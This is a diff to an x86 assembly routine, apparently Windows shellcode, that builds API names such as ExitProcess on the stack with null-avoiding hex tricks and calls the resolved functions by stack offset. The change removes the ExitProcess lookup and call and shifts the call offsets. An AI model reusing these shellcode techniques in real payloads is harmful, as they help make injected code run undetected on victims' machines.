@@ -99,18 +99,6 @@ add esp, 12
 push eax                               ; Function address on the stack
 
 xor eax, eax
-mov eax, 0x23737365
-push eax
-sub dword [esp + 3], 0x23
-push 0x636f7250
-push 0x74697845
-push esp                               ; String on the stack
-push dword [esp + 40]
-call [esp + 40]
-add esp, 12
-push eax                               ; Function address on the stack
-
-xor eax, eax
 mov eax, 0x23726564
 push eax
 sub dword [esp + 3], 0x23
@@ -143,7 +131,7 @@ push dword [ESP + 8]
 push dword [ESP + 48]
 xor eax, eax
 push eax
-call [ESP + 104]
+call [ESP + 100]
 add ESP, 72
 xor eax, eax
 mov al, 0x72
@@ -160,7 +148,7 @@ push esp
 xor eax, eax
 push eax
 push dword [ESP + 4]
-call [ESP + 52]
+call [ESP + 48]
 add ESP, 36
 xor eax, eax
 mov al, 0x72
@@ -175,7 +163,7 @@ push 0x6e69614d
 push esp
 
 push dword [ESP + 0]
-call [ESP + 44]
+call [ESP + 40]
 add ESP, 36
 xor eax, eax
 mov ax, 0x6578
@@ -187,8 +175,5 @@ push 0x6e69614d
 push esp
 
 push dword [ESP + 0]
-call [ESP + 32]
+call [ESP + 28]
 add ESP, 24
-xor eax, eax
-push eax
-call [ESP + 4]
